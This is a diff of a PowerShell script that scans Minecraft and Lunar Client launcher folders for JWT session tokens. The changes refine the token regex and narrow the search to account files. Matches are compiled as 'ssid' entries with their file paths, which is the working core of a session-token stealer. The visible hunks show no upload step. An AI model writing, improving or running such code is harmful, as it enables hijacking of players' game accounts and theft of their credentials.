@@ -33,6 +33,7 @@ $paths = @(
 )
 
 $found = @()
+$jwtRegex = "eyJhbGciOiJIUzI1NiJ9\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"
 
 # scan known paths
 foreach($p in $paths){
@@ -56,7 +57,7 @@ foreach($p in $paths){
                 }
             }
             if(-not $tok){
-                $m = [regex]::Match($raw, "eyJhbGciOi[A-Za-z0-9_\-\.]+")
+                $m = [regex]::Match($raw, $jwtRegex)
                 if($m.Success){ $tok = $m.Value }
             }
             if($tok){
@@ -67,7 +68,7 @@ foreach($p in $paths){
     }
 }
 
-# deep scan launcher folders
+# deep scan launcher folders - only account files
 $roots = @(
     "$env:APPDATA\.minecraft",
     "$env:APPDATA\.lunarclient",
@@ -82,10 +83,10 @@ $roots = @(
 foreach($r in $roots){
     if(Test-Path $r){
         try{
-            Get-ChildItem $r -Recurse -File -Include "*.json" -EA 0 | %{
+            Get-ChildItem $r -Recurse -File -Include "accounts.json","launcher_accounts.json","user.json","*.auth.json" -EA 0 | %{
                 if($_.Length -gt 1mb){ return }
                 $c = Get-Content $_.FullName -Raw -EA 0
-                $m = [regex]::Match($c, "eyJhbGciOi[A-Za-z0-9_\-\.]+")
+                $m = [regex]::Match($c, $jwtRegex)
                 if($m.Success){
                     $found += "user: unknown`nssid: $($m.Value)`nfile: $($_.FullName)`n"
                 }
